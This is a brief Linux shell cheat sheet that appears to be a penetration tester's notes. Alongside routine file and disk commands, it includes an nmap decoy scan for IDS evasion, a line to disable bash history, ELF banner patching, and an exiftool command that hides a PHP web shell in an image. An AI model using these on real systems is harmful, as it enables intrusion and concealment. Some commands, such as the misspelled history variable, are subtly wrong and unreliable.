# Define variable:
export varname="value"
echo $varname

# Get actual PID:
echo "$$"

# Check env vars:
env

# Nmap Host Scanning:
nmap -sn 127.0.0.1/24 -oG output.txt

# Try to Bypass IDS/IPS:
nmap -v -D RND:64 -sV -T2 --top-ports=50 --open

# Disable bash log in this session:
unset HITSFILE #.bash_history

# Remote GUI program with ssh:
ssh -fX user@host program
# Ex: ssh -fX user@host wireshark

# Change ELF banner with bless:
# 1) Find bin with.
whereis [bin] # Ex: whereis sshd
# You can check it with: strings [bin]
# 2) Open ELF with bless:;
bless [bin]
# Search banner by string and save.
# Save in original folder.
# Done. :)

# Place holders:
* # Any set of characters
? # Any single character
[a-f] # Any inside the set abcdef
[^a-f] # Any outside the set abcdef


# Change Linux Default TTL:
/proc/sys/net/ipv4/ip_default_ttl # 

# Check subfolders size:
du -h -max-depth=2

# Check files and folders size:
du -sh *

# Check for duplicates with md5sum and file size:
find -not -empty -type f -printf "%s\n" | sort -rn | uniq -d | xargs -I{} -n1 find -type f -size {}c -print0 | xargs -0 md5sum | sort | uniq -w32 --all-repeated=separate

# Insert PHP payload with exiftool:
exiftool -Comment='<?php system($_GET['do']); ?>' img.jpg

# Compression:
bzip2 [FILE/FOLDER]
bunzip2 [FILE/FOLDER]
